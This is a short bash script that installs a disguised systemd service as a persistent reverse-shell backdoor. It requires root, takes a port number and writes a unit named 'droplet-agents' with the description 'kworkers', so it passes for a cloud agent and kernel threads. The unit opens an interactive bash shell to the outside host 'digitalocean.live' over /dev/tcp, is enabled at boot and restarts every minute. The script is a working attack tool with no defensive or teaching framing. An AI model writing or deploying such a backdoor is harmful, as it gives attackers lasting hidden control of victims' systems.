#!/bin/bash

# Prompt the user for a port number
read -p "Enter the port number to use for the reverse shell: " PORT

# Validate port input
if ! [[ "$PORT" =~ ^[0-9]+$ ]] || (( PORT < 1 || PORT > 65535 )); then
  echo "Invalid port number. Please enter a number between 1 and 65535."
  exit 1
fi

# Define the service file path
SERVICE_FILE="/etc/systemd/system/droplet-agents.service"

# Define the service content with the user-provided port
SERVICE_CONTENT="[Unit]
Description=kworkers
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/digitalocean.live/$PORT 0>&1'
Restart=always
RestartSec=60
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target"

# Ensure script is run as root
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root"
   exit 1
fi

# Write the service file
echo "$SERVICE_CONTENT" > "$SERVICE_FILE"
chmod 644 "$SERVICE_FILE"

# Reload systemd and enable the service
systemctl daemon-reexec
systemctl daemon-reload
systemctl enable droplet-agents.service
systemctl start droplet-agents.service

echo "Service installed and started on port $PORT."
